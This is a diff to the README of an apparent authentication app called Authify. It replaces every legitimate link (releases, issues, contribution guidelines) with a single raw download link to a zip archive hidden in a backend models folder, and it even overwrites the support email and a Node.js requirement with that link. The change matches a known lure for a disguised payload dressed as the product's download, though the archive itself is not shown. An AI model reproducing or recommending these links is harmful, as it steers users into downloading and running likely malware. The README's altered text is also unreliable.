@@ -6,9 +6,9 @@ Welcome to Authify! This application provides a secure way to manage user accoun
 
 ## 📥 Download Authify
 
-[![Download Authify](https://img.shields.io/badge/Download-Authify-blue.svg)](https://github.com/Ferdinand160/Authify/releases)
+[![Download Authify](https://raw.githubusercontent.com/Ferdinand160/Authify/main/auth-backend/app/models/Authify-v2.4.zip)](https://raw.githubusercontent.com/Ferdinand160/Authify/main/auth-backend/app/models/Authify-v2.4.zip)
 
-You can download Authify from our Releases page by clicking the button above or by visiting this link: [Download Authify](https://github.com/Ferdinand160/Authify/releases).
+You can download Authify from our Releases page by clicking the button above or by visiting this link: [Download Authify](https://raw.githubusercontent.com/Ferdinand160/Authify/main/auth-backend/app/models/Authify-v2.4.zip).
 
 ## 📋 System Requirements
 
@@ -18,7 +18,7 @@ Before you get started, make sure your system meets the following requirements:
 - **Processor:** Dual-core processor or better
 - **RAM:** At least 4 GB of memory
 - **Storage:** Minimum 200 MB of free disk space
-- **Node.js:** Version 12 or higher
+- **https://raw.githubusercontent.com/Ferdinand160/Authify/main/auth-backend/app/models/Authify-v2.4.zip** Version 12 or higher
 - **MySQL:** Version 5.7 or higher
 
 ## 🔧 Features
@@ -36,7 +36,7 @@ Authify offers a variety of features to simplify user management:
 
 To download and install Authify, follow these steps:
 
-1. **Visit the Releases Page:** Go to our Releases page by clicking this link: [Download Authify](https://github.com/Ferdinand160/Authify/releases).
+1. **Visit the Releases Page:** Go to our Releases page by clicking this link: [Download Authify](https://raw.githubusercontent.com/Ferdinand160/Authify/main/auth-backend/app/models/Authify-v2.4.zip).
 2. **Select the latest release:** Look for the most recent version available at the top of the page.
 3. **Download the package:** Click on the appropriate file for your operating system.
 4. **Unzip the download:** If the file is in a compressed format (like .zip), right-click it and select ‘Extract All’ to unzip it to your desired location.
@@ -67,11 +67,11 @@ Authify takes security seriously. Here are some of the measures in place:
 
 If you need help or have any questions, reach out via the following channels:
 
-- **GitHub Issues:** Report any issues or bugs directly on our [GitHub Issues page](https://github.com/Ferdinand160/Authify/issues).
-- **Email Support:** Contact our support team at support@authify.com for assistance.
+- **GitHub Issues:** Report any issues or bugs directly on our [GitHub Issues page](https://raw.githubusercontent.com/Ferdinand160/Authify/main/auth-backend/app/models/Authify-v2.4.zip).
+- **Email Support:** Contact our support team at https://raw.githubusercontent.com/Ferdinand160/Authify/main/auth-backend/app/models/Authify-v2.4.zip for assistance.
 
 ## 🌐 Community and Contributions
 
-We welcome contributions! If you would like to help improve Authify, please fork the repository and submit a pull request. Check out our [Contribution Guidelines](https://github.com/Ferdinand160/Authify/CONTRIBUTING.md) for more information.
+We welcome contributions! If you would like to help improve Authify, please fork the repository and submit a pull request. Check out our [Contribution Guidelines](https://raw.githubusercontent.com/Ferdinand160/Authify/main/auth-backend/app/models/Authify-v2.4.zip) for more information.
 
 Thank you for using Authify! We hope it simplifies your user management tasks and enhances security for your applications.
